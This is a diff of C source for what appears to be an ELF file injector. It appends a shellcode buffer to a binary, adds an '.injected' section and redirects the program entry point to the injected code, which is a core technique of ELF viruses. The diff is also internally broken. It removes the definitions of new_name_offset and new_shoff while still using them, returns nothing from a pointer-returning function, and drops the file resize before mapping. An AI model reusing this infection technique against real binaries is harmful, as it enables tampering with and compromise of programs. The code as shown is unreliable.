@@ -109,18 +109,8 @@ void *update_elf(void *map, size_t aligned_offset, int fd)
 {
 	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
 	Elf64_Shdr *shdr_table = (Elf64_Shdr *)(map + ehdr->e_shoff);
-	Elf64_Off old_shoff = ehdr->e_shoff;
-	int old_shnum = ehdr->e_shnum;
+	
 	size_t shellcode_size = sizeof(shellcode);
-
-	Elf64_Shdr *shstrtab = &shdr_table[ehdr->e_shstrndx];
-	char *shstrtab_data = (char *)(map + shstrtab->sh_offset);
-
-	// Find current end of .shstrtab
-	size_t new_name_offset = shstrtab->sh_size;
-	char *new_shstrtab_data = realloc(NULL, shstrtab->sh_size + 10); // enough for ".injected\0"
-	memcpy(new_shstrtab_data, shstrtab_data, shstrtab->sh_size);
-	memcpy(new_shstrtab_data + shstrtab->sh_size, ".injected", 10);
 
 	Elf64_Shdr injected_section = {0};
 	injected_section.sh_name = new_name_offset; // Offset in new .shstrtab
@@ -131,30 +121,37 @@ void *update_elf(void *map, size_t aligned_offset, int fd)
 
 	// Calculate sh_addr (virtual address)
 	Elf64_Phdr *phdr = (Elf64_Phdr *)(map + ehdr->e_phoff);
-	Elf64_Off base_offset = 0;
-	Elf64_Addr base_vaddr = 0;
 	// This makes sure the shellcode's file offset aligns with where it will be loaded into memory when executed.
 	for (int i = 0; i < ehdr->e_phnum; i++) {
 		if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & PF_X)) {
-			base_offset = phdr[i].p_offset;
-			base_vaddr = phdr[i].p_vaddr;
-			injected_section.sh_addr = base_vaddr + (aligned_offset - base_offset);
+			injected_section.sh_addr = phdr[i].p_vaddr + (aligned_offset - phdr[i].p_offset);
 			break;
 		}
 	}
 
-	Elf64_Off new_shoff = ALIGN_UP(aligned_offset + shellcode_size, 0x1000);
-	ftruncate(fd, new_shoff + (ehdr->e_shnum + 1) * sizeof(Elf64_Shdr)); // Add space for new SHT
+	// Resize the memory map
+	size_t new_size = aligned_offset + shellcode_size;
+	void *new_map = mmap(NULL, new_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+	if (new_map == MAP_FAILED) {
+		perror("problem mapping file");
+		return;
+	}
+	memcpy(new_map + aligned_offset, shellcode, shellcode_size);
+	
+	// save original entry point
+	Elf64_Addr original_entry = ehdr->e_entry;
 
-	// Copy old section headers and append the new one
-	Elf64_Shdr *old_shdr_table = (Elf64_Shdr *)(map + ehdr->e_shoff);
+	// Update ELF header and Set entry point to the start of the injected code
+	ehdr->e_shoff = aligned_offset + shellcode_size;
+    ehdr->e_shnum += 1;
+    ehdr->e_entry = injected_section.sh_addr;
+	printf("New entry point set to: 0x%lx\n", ehdr->e_entry);
+
+
+	// update section header
 	Elf64_Shdr *new_shdr_table = (Elf64_Shdr *)(map + new_shoff);
-	memcpy(new_shdr_table, old_shdr_table, ehdr->e_shnum * sizeof(Elf64_Shdr));
+	memcpy(new_shdr_table, shdr_table, ehdr->e_shnum * sizeof(Elf64_Shdr));
 	memcpy(&new_shdr_table[ehdr->e_shnum], &injected_section, sizeof(Elf64_Shdr));
-
-	// Update ELF header
-	ehdr->e_shoff = new_shoff;
-	ehdr->e_shnum += 1;
 }
 
 /*
@@ -179,7 +176,6 @@ void *append_shellcode(char *str)
 
 	size_t new_size = aligned_offset + sizeof(shellcode);
 
-	ftruncate(fd, new_size);
 	// MAP_SHARED will edit the actual file and not just a copy of it
 	void	*new_map = mmap(NULL, new_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); 
 	if (new_map == MAP_FAILED)
@@ -190,6 +186,7 @@ void *append_shellcode(char *str)
 	}
 	memcpy(new_map + aligned_offset, shellcode, sizeof(shellcode));
 	update_elf(new_map, aligned_offset, fd);
+	close(fd);
 	return (new_map);
 }
 
@@ -247,4 +244,17 @@ int main(void)
 
 	// vera shenanigans
 	inspection(header, section_headers, map, text_sheader, text_ind);
+	void *new_map = append_shellcode("skip");
+
+	Elf64_Ehdr	*new_header = (Elf64_Ehdr *)new_map;
+	Elf64_Shdr	*new_section_headers = (Elf64_Shdr *)(new_map + new_header->e_shoff);
+
+	int	new_sheader_nbr = new_header->e_shnum;
+	int new_sheader_size = new_header->e_shentsize;
+
+
+	int new_text_ind = get_text_section_index(new_map, new_header);
+	Elf64_Shdr	*new_text_sheader = (Elf64_Shdr *)&new_section_headers[new_text_ind];
+	printf("text section offset [%p] and size [%d]\n", new_text_sheader->sh_offset, new_text_sheader->sh_size);
+	inspection(new_header, new_section_headers, new_map, new_text_sheader, new_text_ind);
 }
